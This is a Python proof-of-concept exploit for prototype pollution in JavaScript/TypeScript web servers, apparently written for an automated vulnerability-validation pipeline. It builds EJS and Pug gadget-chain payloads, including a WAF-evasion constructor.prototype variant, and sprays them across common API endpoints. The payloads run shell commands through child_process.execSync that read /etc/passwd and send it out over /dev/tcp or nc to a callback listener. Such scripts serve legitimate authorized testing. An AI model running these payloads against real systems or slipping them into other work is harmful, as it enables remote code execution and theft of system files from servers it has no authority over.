#!/usr/bin/env python3
"""
PoC: Prototype Pollution — JavaScript/TypeScript Targets Only

Vulnerability: User-controlled JSON body flows into an unsafe deep-merge
(e.g., lodash.merge, deepmerge, Object.assign with __proto__) without key
sanitization, polluting Object.prototype. When a downstream template engine
(EJS, Pug, Handlebars) or NODE_PATH gadget is present, prototype pollution
escalates to Remote Code Execution.

Language gate: JS/TS TARGETS ONLY — __proto__ is a JavaScript prototype chain
concept with no equivalent in Python, Java, or Go.

CVE examples: CVE-2019-10744 (lodash merge), CVE-2020-28499 (merge),
              CVE-2021-25928 (set-value), CVE-2022-0686 (url-parse)
CVSS: 8.1 (RCE via gadget chain) / 6.5 (privilege escalation only)

Validation strategy:
  - Poll a unique marker endpoint / check JSON response for polluted key
  - TCP listener on port 59876 detects OOB callback from gadget chain
  - Marker file /tmp/pp_rce_<id> written by gadget chain confirms RCE

Usage (authorized testing only, inside Docker):
    python poc_prototype_pollution_001.py --target http://localhost:3000 --timeout 30

Exit codes:
    0 - CONFIRMED: Prototype pollution confirmed (RCE or property leak detected)
    1 - NOT_REPRODUCED: No evidence of pollution within timeout
    2 - ERROR: Script error or target unreachable

IMPORTANT: Only use against systems you have explicit written authorization
to test. For JavaScript/TypeScript targets only.
"""

import argparse
import base64
import json
import socket
import sys
import threading
import time

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("[ERROR] PP-001: 'requests' library is required.")
    sys.exit(2)

VULN_ID = "PP-001"
CALLBACK_PORT = 59876

# ── Gadget chain payloads ──────────────────────────────────────────────────────
# Each payload attempts a different pollution vector. They are tried in order.
# The EJS gadget (`outputFunctionName`) reliably triggers RCE when EJS >= 3.1.6
# is present. Pug gadget (`pretty`) works for Pug < 3.0.1.

def build_payloads(marker_id: str, callback_host: str = "127.0.0.1") -> list[dict]:
    """Return a list of (description, JSON-serialisable body) pairs."""
    marker_path = f"/tmp/pp_rce_{marker_id}"
    cmd = f"touch {marker_path}"
    # OOB callback command — writes marker AND pings back via nc
    oob_cmd = (
        f"touch {marker_path}; "
        f"bash -c 'cat /etc/passwd > /dev/tcp/{callback_host}/{CALLBACK_PORT}' 2>/dev/null || "
        f"nc -w1 {callback_host} {CALLBACK_PORT} < /etc/passwd 2>/dev/null"
    )

    return [
        # ── Vector 1: EJS outputFunctionName gadget (RCE) ──────────────────
        (
            "EJS outputFunctionName gadget",
            {
                "__proto__": {
                    "outputFunctionName": (
                        f"x; process.mainModule.require('child_process')"
                        f".execSync('{oob_cmd}'); x"
                    )
                }
            },
        ),
        # ── Vector 2: EJS escapeXML gadget (RCE, alternate EJS property) ───
        (
            "EJS escapeXML gadget",
            {
                "__proto__": {
                    "escapeXML": (
                        f"x; require('child_process')"
                        f".execSync('{oob_cmd}'); x"
                    )
                }
            },
        ),
        # ── Vector 3: Pug pretty gadget (RCE via Pug < 3.0.1) ──────────────
        (
            "Pug pretty gadget",
            {
                "__proto__": {
                    "pretty": (
                        f"\"; require('child_process')"
                        f".execSync('{oob_cmd}'); \""
                    )
                }
            },
        ),
        # ── Vector 4: constructor.prototype bypass (WAF evasion) ────────────
        (
            "constructor.prototype EJS gadget",
            {
                "constructor": {
                    "prototype": {
                        "outputFunctionName": (
                            f"x; require('child_process')"
                            f".execSync('{oob_cmd}'); x"
                        )
                    }
                }
            },
        ),
        # ── Vector 5: Pollution-only detection (no gadget, checks leakage) ──
        (
            "pollution-only marker (canary leak detection)",
            {
                "__proto__": {
                    f"pp_canary_{marker_id}": True,
                    "polluted": True,
                }
            },
        ),
    ]


# ── Injection-prone endpoints ──────────────────────────────────────────────────
INJECTION_ENDPOINTS = [
    "/api/merge",
    "/api/update",
    "/api/settings",
    "/api/preferences",
    "/api/profile",
    "/api/user",
    "/settings",
    "/profile",
    "/merge",
    "/update",
    "/",
]

# ── TCP listener (OOB callback detection) ─────────────────────────────────────

class CallbackListener:
    """TCP listener that detects inbound OOB callback from gadget chain."""

    def __init__(self, port: int):
        self.port = port
        self.received = False
        self.data = b""
        self._server: socket.socket | None = None
        self._thread: threading.Thread | None = None

    def start(self) -> bool:
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self._server.bind(("0.0.0.0", self.port))
            self._server.listen(5)
            self._server.settimeout(1.0)
        except OSError as e:
            print(f"[!] {VULN_ID}: Could not bind port {self.port}: {e}")
            return False
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()
        return True

    def _accept_loop(self) -> None:
        while not self.received:
            try:
                conn, _addr = self._server.accept()
                self.data = conn.recv(4096)
                self.received = True
                conn.close()
            except socket.timeout:
                continue
            except Exception:
                break

    def stop(self) -> None:
        if self._server:
            self._server.close()

    def wait_for_callback(self, timeout: float) -> bool:
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self.received:
                return True
            time.sleep(0.2)
        return False


# ── Injection engine ───────────────────────────────────────────────────────────

def inject_payloads(
    session: requests.Session,
    target: str,
    payloads: list[tuple[str, dict]],
    marker_id: str,
) -> dict | None:
    """
    Send each payload to every injection-prone endpoint.
    Returns evidence dict on first sign of confirmed pollution, else None.
    """
    canary_key = f"pp_canary_{marker_id}"

    for desc, body in payloads:
        for endpoint in INJECTION_ENDPOINTS:
            url = target.rstrip("/") + endpoint
            try:
                # POST JSON body — primary attack vector
                resp = session.post(
                    url,
                    json=body,
                    headers={"Content-Type": "application/json"},
                    timeout=5,
                    allow_redirects=False,
                )
                # Check if canary key leaked into response JSON
                if resp.headers.get("Content-Type", "").startswith("application/json"):
                    try:
                        rjson = resp.json()
                        if canary_key in str(rjson) or "polluted" in str(rjson):
                            return {
                                "vector": desc,
                                "url": url,
                                "evidence": f"Canary key '{canary_key}' reflected in response",
                                "response_snippet": str(rjson)[:200],
                            }
                    except Exception:
                        pass

                # Also try PUT/PATCH for settings-update style endpoints
                for method in (session.put, session.patch):
                    try:
                        method(
                            url,
                            json=body,
                            headers={"Content-Type": "application/json"},
                            timeout=5,
                            allow_redirects=False,
                        )
                    except RequestException:
                        pass

            except RequestException:
                continue

    return None


# ── Main exploit logic ─────────────────────────────────────────────────────────

def run_exploit(target: str, timeout: int) -> tuple[int, dict]:
    import secrets
    marker_id = secrets.token_hex(8)

    print(f"[*] {VULN_ID}: Prototype Pollution PoC (JS/TS gadget chain)")
    print(f"[*] {VULN_ID}: Target: {target}")
    print(f"[*] {VULN_ID}: Marker ID: {marker_id}")
    print(f"[*] {VULN_ID}: OOB listener on port {CALLBACK_PORT}")
    print(f"[*] {VULN_ID}: Marker file: /tmp/pp_rce_{marker_id}")

    listener = CallbackListener(CALLBACK_PORT)
    if not listener.start():
        print(f"[WARN] {VULN_ID}: Could not start TCP listener — OOB detection disabled")

    session = requests.Session()

    # Verify target is reachable
    try:
        probe = session.get(target, timeout=10)
        print(f"[*] {VULN_ID}: Target reachable (HTTP {probe.status_code})")
    except RequestException as e:
        listener.stop()
        print(f"[ERROR] {VULN_ID}: Target unreachable: {e}")
        return 2, {}

    payloads = build_payloads(marker_id)
    print(
        f"[*] {VULN_ID}: Injecting {len(payloads)} payload variants "
        f"across {len(INJECTION_ENDPOINTS)} endpoints..."
    )

    # Phase 1: inject all payloads
    inline_evidence = inject_payloads(session, target, payloads, marker_id)

    if inline_evidence:
        listener.stop()
        print(f"[CONFIRMED] {VULN_ID}: Pollution detected via canary leak!")
        print(f"[CONFIRMED] {VULN_ID}: Vector: {inline_evidence['vector']}")
        print(f"[CONFIRMED] {VULN_ID}: URL: {inline_evidence['url']}")
        return 0, inline_evidence

    # Phase 2: wait for OOB callback (gadget chain RCE)
    wait_time = min(timeout, 10)
    print(f"[*] {VULN_ID}: Waiting {wait_time}s for OOB gadget-chain callback...")
    oob_received = listener.wait_for_callback(wait_time)
    listener.stop()

    if oob_received:
        evidence = (
            f"OOB TCP callback received on port {CALLBACK_PORT}; "
            f"data snippet: {listener.data[:64]!r}"
        )
        print(f"[CONFIRMED] {VULN_ID}: Prototype pollution → RCE confirmed!")
        print(f"[CONFIRMED] {VULN_ID}: {evidence}")
        return 0, {
            "marker_id": marker_id,
            "marker_path": f"/tmp/pp_rce_{marker_id}",
            "evidence": evidence,
        }

    # Phase 3: check for marker file (if running inside Docker exec context)
    # Validator agent will check /tmp/pp_rce_<id> via docker exec
    print(f"[-] {VULN_ID}: No OOB callback received within {wait_time}s")
    print(
        f"[*] {VULN_ID}: Validate manually: "
        f"docker exec <container> ls /tmp/pp_rce_{marker_id}"
    )
    print(
        f"[*] {VULN_ID}: Check for lodash/deepmerge/qs without key sanitization "
        f"in package.json"
    )
    return 1, {"marker_id": marker_id, "marker_path": f"/tmp/pp_rce_{marker_id}"}


def main() -> None:
    parser = argparse.ArgumentParser(
        description=f"PoC for Prototype Pollution ({VULN_ID}) — JS/TS targets only",
        epilog="For authorized security testing of JavaScript/TypeScript applications only.",
    )
    parser.add_argument("--target", default="http://localhost:3000")
    parser.add_argument("--timeout", type=int, default=30)
    args = parser.parse_args()

    target = args.target.rstrip("/")
    if not target.startswith(("http://", "https://")):
        print(f"[ERROR] {VULN_ID}: Target must start with http:// or https://")
        sys.exit(2)

    try:
        exit_code, results = run_exploit(target, args.timeout)
    except KeyboardInterrupt:
        print(f"\n[!] {VULN_ID}: Interrupted")
        sys.exit(2)
    except Exception as e:
        print(f"[ERROR] {VULN_ID}: Unhandled exception: {e}")
        sys.exit(2)

    if exit_code == 0:
        print(f"[CONFIRMED] {VULN_ID}: Prototype pollution confirmed (CVSS 8.1)")
    elif exit_code == 1:
        print(f"[NOT_REPRODUCED] {VULN_ID}: Prototype pollution not reproduced")
    sys.exit(exit_code)


if __name__ == "__main__":
    main()
